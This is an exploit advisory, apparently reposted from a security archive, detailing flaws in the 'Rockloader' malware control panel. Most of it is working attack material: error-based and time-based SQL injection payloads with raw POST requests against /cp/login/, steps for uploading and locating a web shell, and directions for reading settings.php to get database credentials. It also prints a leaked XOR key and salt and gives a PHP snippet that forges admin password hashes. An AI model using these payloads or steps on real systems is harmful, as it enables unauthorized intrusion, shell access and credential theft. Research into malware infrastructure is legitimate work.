# Rockloader

    Type: SQLi and shell file upload
    Author: Danail Velev
    Contact: ICQ: 209030 / d.velev@colocation.bg
    Website: http://colocation.bg/
    Software: https://github.com/colocation/RockLoader-source
    Original Release: https://cxsecurity.com/ascii/WLB-2016070003

## Summary: SQL Injections
NO user registration required. The Command and Control Server processing the spread requests,user tasks and responsible for the process, is suffering from mutiple remote sql injection. Common C&C server path is "/cp/login/" in most common setups. Since the specific of the spreader and it's functionality, methods of encryption and working process, There is possibility for RCE,MSF/CMD injection and local root post 
explotation.

In common cases the setup comes with this specific configs.
- user has full priviligies to host sql server.
- you can interact with local file read in most conditions.
- user is database administrator in most conditions.
- database name and structure are identical since it comes as phpmyadmin dump.
- file write and read is a must.
- user screen capture plugin on advanced setups.
- default database name is 'appdater'


## Proof of Concept:

Affected parameters are "username" and "password" via specifict POST request.
The 3th parameter is the php session.


###----=(SQL Injection 1)=----
```
Type: error-based
Method: POST
Request Type: XMLHttpRequest
Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP 
BY clause (FLOOR)
Payload example for POST parameter username: 
password=S0M3PaSSw0rd&username=-1' OR 32 AND ROW(9213,8915)>(SELECT 
COUNT(*),CONCAT(0x716a707071,(SELECT 
(ELT(9213=9213,1))),0x71767a7071,FLOOR(RAND(0)*2))x FROM (SELECT 4118 
UNION SELECT 5903 UNION SELECT 7493 UNION SELECT 1139)a GROUP BY x)-- 
KSxg1=6 AND 000580=000580 --
Example raw request for host: 127.0.0.1
-----------------EXAMPLE--------------------
POST /cp/login/ HTTP/1.1
Content-Length: 87
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: 127.0.0.1/cp/login/
Cookie: PHPSESSID=c4u29lkhiavel5vt14tchcb190
Host: 127.0.0.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 
(KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
password=S0M3PaSSw0rd&username=d0na1DTrump
-----------------END--------------------
```
###----=(SQL Injection 2)=----
```
Type: AND/OR time-based blind
Method: POST
Request Type: XMLHttpRequest
Title: MySQL >= 5.0.12 AND time-based blind
Payload example for POST parameter username: 
password=S0M3PaSSw0rd&username=-1' OR 32 AND SLEEP(5)-- sWMh1=6 AND 
000580=000580 --
Example raw request for host: 127.0.0.1
-----------------EXAMPLE--------------------
POST /cp/login/ HTTP/1.1
Content-Length: 87
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: 127.0.0.1/cp/login/
Cookie: PHPSESSID=c4u29lkhiavel5vt14tchcb190
Host: 127.0.0.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 
(KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
password=S0M3PaSSw0rd&username=d0na1DTrump
-----------------END--------------------
```

###----=(Shell Upload POC)=----
```
Requirements:
- Valid user for control panel.
- Access to database for reading.

Step1:
Upload your shell as new file via Control Panel.
Name it: OWNED
Note: filename is masked in control panel

Step2:
See 'file' table at 'appdater' database.
QUERY: SELECT * FROM `file`;
Look for name=OWNED and coresponding file_path name (EXAMPLE: 
C932kc.php)

Step3:
Location of your Shell
http://127.0.0.1/files/c932kc.php

-----------------END--------------------
```
###----=(Database user and password disclose)=----
```

Example request to get the directory location:

===============================================
POST /cp/login/ HTTP/1.1
Content-Length: 87
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: 127.0.0.1/cp/login/
Cookie: PHPSESSID=c4u29lkhiavel5vt14tchcb190
Host: 127.0.0.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 
(KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
password=S0M3PaSSw0rd&username=d0na1DTrump
===============================================
Response if error reporting is enabled:

<br />
<b>Notice</b>:  A session had already been started - ignoring 
session_start() in <b>/var/www/html/cp/login/auth.php</b> on line 
<b>23</b><br />


===============================================

Read the settings.php file of the control panel to obtain user and 
password for database.
location: /var/www/html/cp/settings.php

----Snip-----
<?php
//Debug
ini_set('error_reporting', E_ALL);  // REMOVE TO TURN DEBUG OFF
ini_set('display_errors', 1);       // REMOVE TO TURN DEBUG OFF

//MySQL settings
define('DB_HOSTNAME', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', '');
define('DB_DATABASE', 'appdater'); <- most of the time this is the 
default database since it's come in the bundle.
define('DB_PORT', '3307');

......
---EndSnip---
```
###----=(XOR Encrypton key and password salt disclose)=----
```

Read the settings.php file (/var/www/appdater/html/settings.php)
Look at the global configuration for the app.

----Snip-----
//GLOBAL settings
define('XOR_KEY', 'aWL~jH9zJl$5Yfz7'); <- File encryption XOR_KEY
define('FILES_URL', 'https://summerr554fox.su/files/'); <- address of 
all uploaded files
define('APPDATER_PATH', '/var/www/html/');
define('SALT', 'KsqwGzTl?Qwq|oHA'); <- SALT KEY FOUND !
?>
---EndSnip---
TADAAAAAAAAAAAAAAAAAAAAAAAAAa we got the password for the sql and even 
more: XOR_KEY for file encyption, EXE files location, PATH to the 
Control Panel anddd....
The most important --> THE SALT !

```
###---=(Admin panel password generator)=---
```

Read the core/functions.php file 
(/var/www/appdater/html/core/functions.php)
Look for this

---Snip-----
     function create_hash( $string ) {
         return substr( sha1( SALT . $string ), 3, 17 );
     }
----EndSnip---

TADAAAA so we got and the algo used to create correct user and 
password.


<?php
define('SALT', 'KsqwGzTl?Qwq|oHA');
     function create_hash( $string ) {
         return substr( sha1( SALT . $string ), 3, 17 );
     }
echo create_hash('S0M3PaSSw0rd');
?>

```

